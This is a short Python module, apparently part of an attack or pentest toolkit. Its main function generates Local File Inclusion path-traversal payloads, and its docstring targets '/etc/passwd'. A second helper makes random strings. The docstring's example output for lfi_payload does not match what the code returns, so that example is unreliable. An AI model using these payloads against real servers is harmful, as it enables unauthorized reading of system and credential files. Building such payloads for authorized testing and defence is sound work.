
import random
import string


def lfi_payload(file_abs_path: str, prev_count: int = 10):
    """
    Generate a Local File Inclusion (LFI) payload.

    This function takes a file absolute path and a previous count as input and generates a payload
    that can be used for Local File Inclusion attacks. The payload consists of a series of '../'
    to traverse up the directory structure and then appends the file absolute path.

    Parameters:
    - file_abs_path (str): The absolute path of the file to include.
    - prev_count (int): The number of directories to traverse up before including the file.
                        Defaults to 10.

    Returns:
    - str: The LFI payload.

    Example:
    >>> lfi_payload('/etc/passwd', 3)
    '../../../../../etc/passwd'
    """
    return "../" * (prev_count - 1) + '..' + file_abs_path

def random_string(length: int = 10):
    """
    Generate a random string to show arbitrary values can be input.

    This function generates a random string of a given length using the ASCII characters.

    Parameters:
    - length (int): The length of the random string. Defaults to 10.

    Returns:
    - str: The random string.

    Example:
    >>> random_string(5)
    'aBcDe'
    """
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))